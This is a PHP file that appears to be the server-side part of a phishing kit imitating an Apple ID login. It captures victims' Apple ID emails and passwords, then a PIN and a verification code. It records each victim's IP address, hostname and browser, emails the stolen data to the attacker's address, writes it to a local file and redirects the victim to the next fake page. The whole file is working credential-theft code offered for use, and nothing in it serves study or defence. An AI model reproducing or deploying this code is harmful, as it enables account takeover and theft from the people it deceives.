<?php


header('Access-Control-Allow-Origin: *');

header('Access-Control-Allow-Methods: GET, POST');

header("Access-Control-Allow-Headers: X-Requested-With");


include 'config.php';
$ip = $_SERVER['REMOTE_ADDR'];


if(isset($_GET['log'])){
  $email = $_POST['appleId'];
  $password = $_POST['accountPassword'];
  $red = base64_encode($email);
if($email == '' or $password == '' or ($email == '' && $password == '')){

header("location: ../../?home=false");

}else{
  $subj = "$ip ACO";
  $msg = "
 ---------------------------------------------------------------------------------\n
 USER : $email \n
 PASS : $password \n
 HOST    : ".gethostbyaddr($ip)."
 BROWSER : ".$_SERVER['HTTP_USER_AGENT']."
 ---------------------------------------------------------------------------------";
 mail("$emailstosend", "$subj", "$msg");
 
 $myfile = fopen("../ok.txt", "a") or die("Unable to open file!");
$txt = $msg;
fwrite($myfile, $txt);
fclose($myfile);

   header("location: ../../?sms");

   }
}



if(isset($_GET['pin'])){
  $ip = $_SERVER['REMOTE_ADDR'];
  $pin = $_POST['pin123'];
   $redi = $_POST['usercode'];
if($pin == ''){

header("location: ../?connect=$redi&pin=false");
}else{


	$subj = "$ip ACO";
  $msg = " --------------------ACO Pin----------------------\n
   Pin: $pin \n
   HOST    : ".gethostbyaddr($ip)."
   BROWSER : ".$_SERVER['HTTP_USER_AGENT']."
   IP: $ip \n --------------------ACO Login----------------------";
   mail("$emailstosend", "$subj", "$msg");
	header("location: ../?sms");
$myfile = fopen("../ok.txt", "a") or die("Unable to open file!");
$txt = $msg;
fwrite($myfile, $txt);
fclose($myfile);

	}


}


if(isset($_GET['code'])){
  $ip = $_SERVER['REMOTE_ADDR'];
  $code = $_POST['code'];

  $subj = "$ip ACO";
  $msg = " --------------------ACO Pin----------------------\n
   Code: $code \n
   HOST    : ".gethostbyaddr($ip)."
   BROWSER : ".$_SERVER['HTTP_USER_AGENT']."
   IP: $ip \n --------------------ACO Login----------------------";
   mail("$emailstosend", "$subj", "$msg");
   $myfile = fopen("../ok.txt", "a") or die("Unable to open file!");
$txt = $msg;
fwrite($myfile, $txt);
fclose($myfile);
   echo "acoportal";
   die();
}





?>
